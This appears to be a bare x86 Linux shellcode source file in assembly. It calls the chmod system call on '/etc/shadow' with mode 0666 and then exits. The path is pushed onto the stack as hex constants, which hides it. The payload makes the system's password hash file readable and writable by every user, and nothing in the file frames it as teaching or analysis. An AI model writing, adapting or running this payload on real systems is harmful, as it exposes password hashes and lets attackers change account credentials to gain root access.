section .text

global _start

_start:

	push byte 16
	pop eax
	sub eax, 1
	cdq

	push byte 0x77
	push word 0x6f64
	push 0x6168732f
	push 0x6374652f
	mov ebx, esp
	push word 0666Q
	mov ecx, edx
	pop ecx
	int 0x80

	xor eax,eax
	add eax, 1	
	int 0x80
